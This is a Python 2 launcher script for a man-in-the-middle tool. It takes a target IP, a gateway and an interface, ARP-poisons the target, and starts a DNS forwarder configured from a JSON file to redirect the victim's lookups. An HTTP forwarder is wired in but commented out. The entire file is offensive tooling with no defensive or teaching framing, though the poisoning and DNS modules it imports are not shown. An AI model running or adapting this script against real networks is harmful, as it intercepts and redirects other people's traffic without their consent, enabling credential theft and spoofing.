#!/usr/bin/env python2

import argparse
import os
import threading, time
import sys
import ARPPoisoner
import DNSConf
import DNSfw as DNSforwarder
import multiprocessing
import HTTPForwarder

class SWRT(object):
  args = 0
  def parseArgs(self):
    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--debug", help="increase output verbosity", action="store_true", required=False)
    parser.add_argument('-i', action='store', default="ens33", dest='interface', help='Store the interface', required=False)
    parser.add_argument('-t', action='store', dest='target', help='Store a target IP address', required=True)
    parser.add_argument('-r', action='store', default="192.168.1.1", dest='gateway', help='Store the gateway IP address', required=False)
    parser.add_argument('-c', action='store', dest='conf', default='./conf.json', help='Store path/to/conf.json', required=False)
    SWRT.args = parser.parse_args()
 
  def printArgs(self):
    if SWRT.args.debug:
      print(" -- debug mode on")
    else:
      print(" -- debug mode off")
      print(" -- interface:" +  SWRT.args.interface)
      print(" -- target:" +  SWRT.args.target)
      print(" -- gateway:" +  SWRT.args.gateway)

def main():    
  SWRT().parseArgs()
  SWRT().printArgs()
  
  if (SWRT.args.conf != None):
    conf = DNSConf.DNSConf(SWRT.args.interface, SWRT.args.conf)  
  DNSfw = DNSforwarder.DNSfw(SWRT.args.interface, SWRT.args.gateway, conf)
  HTTPfw = HTTPForwarder.HTTPForwarder(SWRT.args.interface, SWRT.args.gateway)
  
  poisoner = ARPPoisoner.ARPPoisoner(SWRT.args.target, SWRT.args.gateway, SWRT.args.interface)
  poisoner.daemon = True
  DNSfw.daemon = True
  DNSfw.start()
  #HTTPfw.start()
  poisoner.start()
  try:
    DNSfw.join()
    #HTTPfw.join()
  except KeyboardInterrupt:
    poisoner.stop()
    DNSfw.stop()
    #HTTPfw.stop()

if __name__ == '__main__':
  if os.getuid()!=0:
    print("Need root privileges to run properly; Re-run as sudo...")
    sys.exit(1)
  main()